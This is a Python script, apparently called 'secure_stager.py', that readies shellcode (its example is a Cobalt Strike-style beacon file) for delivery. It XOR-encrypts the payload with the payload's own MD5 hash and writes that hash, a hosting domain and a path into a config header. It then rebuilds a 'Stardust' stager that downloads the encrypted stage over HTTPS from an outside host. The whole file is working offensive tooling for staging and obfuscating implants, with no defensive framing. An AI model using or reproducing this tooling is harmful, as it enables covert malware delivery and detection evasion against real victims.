#!/usr/bin/env python3

import sys
import os
import hashlib
import subprocess
from urllib.parse import urlparse

def xor(binary_blob, key):
    # Convert the key to bytes
    key_bytes = key.encode()
    
    # Perform XOR encryption
    encrypted = bytearray()
    key_length = len(key_bytes)
    
    for i, byte in enumerate(binary_blob):
        # XOR the byte with the corresponding byte from the key (cyclically)
        encrypted.append(byte ^ key_bytes[i % key_length])

    return bytes(encrypted)

# Validate args
if len(sys.argv) < 3:
    print("Usage: ./secure_stager.py </path/to/raw/file> <HTTPS url that stage will be hosted at>")
    print("Example: ./secure_stager.py /home/kali/beacon_x64.bin https://www.myhostingdomain.com/aboutus")
    sys.exit()

# Set working directory to this scripts location
os.chdir(os.path.dirname(os.path.abspath(__file__)))

# Grab path that shellcode was saved to
outdir = os.path.dirname(sys.argv[1])
if not outdir:
    outdir = "."

# Validate and parse URL
url = urlparse(sys.argv[2])
if not all([url.scheme, url.netloc, url.path]):
    print("[-] Invalid URL supplied! Example: https://yourhostingsite.com/query.txt")
    sys.exit()
elif url.scheme != "https":
    print("[-] Secure stager only supports https connections!")
    sys.exit()

# Read in raw payload
try:
    with open(sys.argv[1], mode='rb') as file: # b is important -> binary
        stage = file.read()
except FileNotFoundError:
    print(f"Cannot locate {sys.argv[1]}.")
    sys.exit()

# Set filename vars to be used throughout the rest of program
original_stage = f"{outdir}{url.path}_original"
enc_stage = f"{outdir}{url.path}"
stager = f"{outdir}{url.path}_stager.bin"

# Rename original raw payload
os.rename(sys.argv[1], original_stage)

# Calculate MD5 hash of raw payload
stage_md5 = hashlib.md5(stage).hexdigest()

# XOR raw payload with md5 hash
xor_stage = xor(stage, stage_md5)

# Write xor'd payload to disk
with open(enc_stage, mode='wb') as file:
    file.write(xor_stage)

# Write config file
with open("Stardust/include/Config.h", mode ='w') as file:
    file.write(f"#define MD5HASH \"{stage_md5}\"\n")
    file.write(f"#define URL \"{url.netloc}\"\n")
    file.write(f"#define URI \"{url.path}\"")

# Recompile Stardust
# Call in loop because sometimes compilation fails due to race condition
while True:
    try:
        build_ret = subprocess.run(["make", "-C", "Stardust"], capture_output=True, text=True, check=True)
        break
    except subprocess.CalledProcessError:
        pass

# Rename stager
os.rename("Stardust/bin/stardust.x64.bin", stager)

# Print info
print("[SECURE STAGER]")
print(f"Original payload hash: {stage_md5}")
print(f"Original payload renamed to {original_stage}")
print(f"Encrypted payload saved as {enc_stage} | Serve this file at {sys.argv[2]}")
print(f"Secure stager generated and saved as {stager}")
